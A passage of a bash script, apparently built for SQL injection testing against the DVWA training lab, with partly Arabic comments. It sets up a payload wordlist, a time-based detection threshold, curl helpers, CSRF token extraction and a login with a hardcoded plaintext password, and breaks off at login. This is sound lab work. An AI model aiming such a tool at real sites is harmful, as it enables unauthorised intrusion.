#!/usr/bin/env bash
set -euo pipefail


# =============================
# Config
# =============================
DVWA_BASE="http://dvwa.local"
USER="team07"
PASS="Vpwx#zi5W{EB}"
COOKIES="${COOKIES:-$HOME/cookies.txt}"
OUTDIR="${1:-$HOME/evidence_sqli_obf_v2}"
WORDLIST="${2:-$HOME/sqli_wordlist.txt}"
SLEEP_BETWEEN="0.25" # تخفيف ضغط/معدّل الطلبات
TIME_THRESHOLD="4.0" # حد نجاح timing-based


mkdir -p "$OUTDIR"
CSV="$OUTDIR/results_obf.csv"
LOGF="$OUTDIR/run.log"
: > "$LOGF"


log(){ echo "[$(date +'%F %T')] $*" | tee -a "$LOGF" >&2; }


# =============================
# Helpers
# =============================
py_urlencode(){
python3 - <<'PY'
import sys, urllib.parse
s=sys.stdin.read().rstrip('\n')
print(urllib.parse.quote(s, safe=''))
PY
}


urlget(){
curl -s -b "$COOKIES" -c "$COOKIES" -L "$1"
}


post(){
curl -s -b "$COOKIES" -c "$COOKIES" -L "$1" "$2"
}


extract_token(){
# يحاول استخراج user_token و csrftoken لو موجودين
local f="$1"
local ut ct
ut=$(grep -oP "name=['\"]user_token['\"][^>]*value=['\"]\K[^'\"]+" "$f" || true)
ct=$(grep -oP "name=['\"]csrftoken['\"][^>]*value=['\"]\K[^'\"]+" "$f" || true)
echo "$ut|$ct"
}


# =============================
# Login + set security=low
# =============================
ensure_login(){
: > "$COOKIES"
urlget "$DVWA_BASE/login.php" > /tmp/lg.html
IFS='|' read -r UT CT < <(extract_token /tmp/lg.html)


local data
data=(
--data-urlencode "username=$USER"
--data-urlencode "password=$PASS"
--data "Login=Login"
)
if [[ -n "$UT" ]]; then data+=(--data-urlencode "user_token=$UT"); fi


curl -s -b "$COOKIES" -c "$COOKIES" -L "$DVWA_BASE/login.php" "${data[@]}" > /tmp/login_resp.html
